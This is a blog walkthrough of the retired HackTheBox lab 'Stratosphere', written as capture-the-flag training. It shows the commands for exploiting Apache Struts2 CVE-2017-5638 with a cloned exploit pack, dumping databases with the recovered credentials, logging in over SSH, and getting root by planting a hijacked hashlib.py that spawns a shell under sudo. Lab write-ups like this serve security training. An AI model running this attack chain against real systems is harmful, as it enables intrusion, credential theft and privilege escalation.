<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">HacktheBox Stratosphere Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-stratospherewalkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-09-04T15:11:25+00:00">September 4, 2018</time><time class="updated" datetime="2025-07-05T15:31:37+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we will solve another CTF challenge “Stratosphere,” a lab that Hack the Box presents and makes available online for those who want to increase their skills in penetration testing and black box testing. Hack the Box presents Stratosphere as a retired vulnerable lab for practicing online penetration according to your experience level; they offer a collection of vulnerable labs as challenges, from beginner to expert level.</span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Easy</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> find user.txt and root.txt file in the victim’s machine.</span></p>
<h3><span style="color: #800000;"><u>WalkThrough</u></span></h3>
<p><span style="color: #000000;">Since these labs are online available therefore they have static IP. The IP of Stratosphere is 10.10.10.64</span></p>
<p><span style="color: #000000;">Let’s start off with scanning the network to find our target.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV 10.10.10.64</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-as6As5ZJ1A4/W46eHOB2PUI/AAAAAAAAaCk/tWQV1GAFM5AECywvye114Da4aO82jHvtwCEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;">As per nmap port, 80 is open for HTTP let’s explore the target IP in the browser. After exploring port 80, we were welcomed by the following page where we didn’t found any informative clue. </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-r_Jt8tYS1wM/W46eIJGpYII/AAAAAAAAaC0/Dzo-1-jmiwIL2n0RgJTqUqt9xbmceXGlwCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">After then we visit Port 8080 for HTTP proxy and here also we get the same web page. We try to inspect the source code of port 80 and 8080 but we got nothing.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2rzGlTuW7cE/W46eIkrcElI/AAAAAAAAaC4/lvTTZ_n9HBoEHGGFfvjLYjNGs8fwxswrgCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Therefore next we decided to have directory brute force attack with help of Dirbuster and used wordlist “dictionary-list-2.3-medium.txt” for the attack.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iORD8NN1qZg/W46eI5KU9lI/AAAAAAAAaDA/xumQpo1nnaYnn0PVjgRFx_xeshzy6mKuQCEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Luckily it fetched some web directories such as /Monitoring, let’s explore it in the web browser.   </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-td6ah1M-_Pg/W46eI8pAbeI/AAAAAAAAaDg/C9GA9AsoYSYS8d1zo2S7RjI0vSl2zrVyACEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">So when we try to open the URL <strong><em>http://10.10.10.64:8080/Monitoring</em></strong> then it gets a redirect to <strong><em>http://10.10.10.64:8080/Monitoring/example/Welcome.action</em></strong> for login. I closely look at the URL containing <strong>.action extension, </strong>so I made Google search to extract complete information related to this extension. I found action extension is utilized by <strong>apache struts2</strong> which has a history of bugs and vulnerabilities and if you will search for its exploit, you will get a lot of python scripts and exploits to compromise this service.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-8YHF3DZamF4/W46eJ7y0NqI/AAAAAAAAaDk/QMHlFKOVqnUMcuvY-TA0pGSyQEmYDhwdQCEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">So we used nmap script to identify its state of vulnerability</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p8080 --script http-vuln-cve2017-5638 --script-args path=/Monitoring/ 10.10.10.64</pre>
<h5><span style="color: #000000;">Awesome!!! It is vulnerable to cve2017-563, let’s exploit it.</span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-sV8O-6ibbM8/W46eJyJk6cI/AAAAAAAAaDk/NNN0ZmSL3pE8kwcPCz6hE7_qhL_KwM5mwCEwYBhgL/s1600/7.1.png"/></span></p>
<p><span style="color: #000000;">I found an exploit Struts-Apache-ExploitPack, let’s download it from git hub and give full permission.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/drigg3r/Struts-Apache-ExploitPack.git
cd Struts-Apache-ExploitPack
cd Exploiter
ls
chmod 777 Exploit.sh</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-ub6tK7VqcsA/W46eJyMARtI/AAAAAAAAaDg/7v4VFkGtP749uO-UeTFw8dzKQetJkOfhgCEwYBhgL/s1600/7.png"/></strong></span></p>
<p><span style="color: #000000;">Now run the following command to exploit the victim machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./Exploit.sh http://10.10.10.64:8080/Monitoring/example/Welcome.action
id
ls
cat db_connect
Username: admin
Password: admin</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-MCR0Z1M1k08/W46eKUwyiXI/AAAAAAAAaDs/Mm0AeqdxAiMbMMRY9CCycA1FiCFX5iN2wCEwYBhgL/s1600/8.1.png"/></span></p>
<p><span style="color: #000000;">So now we have database credential, let’s utilized them for getting all the information from inside the database. </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mysqldump -u admin -padmin --all-databases --skip-lock-tables</pre>
<p><span style="color: #000000;">Here I found Password “9tc*rhKuG5TyXvUJOrE^5CK7k” for user Richard, now let’s try to connect with SSH using these credential.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wziYRgPRxpU/W46eK7WhGVI/AAAAAAAAaDo/vPs4s55xIRkJd42LpcfR8QEJMWs50FkLgCEwYBhgL/s1600/8.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh richard@10.10.10.64</pre>
<p><span style="color: #000000;">Yuppie we successfully logged in victim’s machine, so now let get the user.txt and root.txt</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls
cat user.txt
cat test.py</pre>
<p><span style="color: #000000;">Here we notice that test.py was computing some hash values and at the end, it will give success.py from inside the root directory and the whole script depends upon hashlib. </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZbQnPIinEhk/W46eK45p38I/AAAAAAAAaDs/D1CYL9D1psoQe1t1ooRH4C8CuAYDZwybgCEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Then we also check sudo rights for Richard and found he has sudo right to run all type of python script. So very first we check test.py file and start solving hashes in order to get success.py</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo /usr/bin/python /home/richard/test.py</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-dBjVEGEe1f0/W46eHXUBcFI/AAAAAAAAaDs/MXBTaGQL1zA7QcGPrLBAPh0ooLBZuixJgCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">So we got the hash value, now we need to decode it and after decoding I found “kayboo!”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-woJdjuT46JM/W46eHKpCJ-I/AAAAAAAAaDs/JQI-fcaZGX4zAU2IriK0TZnnFvcnwxPsACEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">On submitting the decoded text, it generated a new hash for further step and again I decode it and submit the answer and after then again a new hash and it was processing repetitively same at each time on submitting decoded text.</span></p>
<p><span style="color: #000000;">Since test.py was importing hashlib which was a python library so I last option was python library hijacking to escalate the root privilege.    </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-4xsiPzdPxVc/W46eH2M504I/AAAAAAAAaDk/ZcWjz75jD3M-W3vq7a2f9cfdUQrtS7mBwCEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Therefore I create a hashlib.py script in the current directory to import system binary ‘/bin/bash’. Hence now when we will run the test.py then it will import hashlib.py which will calls /bin/bash binary file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo 'import os;os.system("/bin/bash")' &gt; hashlib.py
sudo /usr/bin/python /home/richard/test.py</pre>
<p><span style="color: #000000;">Booom!!! Here we owned root access, now let’s get the root.txt file and finish this task.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-riLsBFtMJtY/W46eIKKuIrI/AAAAAAAAaDs/ca08UTOV6KEY3VvH16XYBYv21xxRb4RmQCEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: </strong></span>Ankur Sachdev is an Information Security consultant and researcher in the field of Network &amp; WebApp Penetration Testing. Contact <strong><a href="https://www.linkedin.com/in/sachdevankur/">Here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
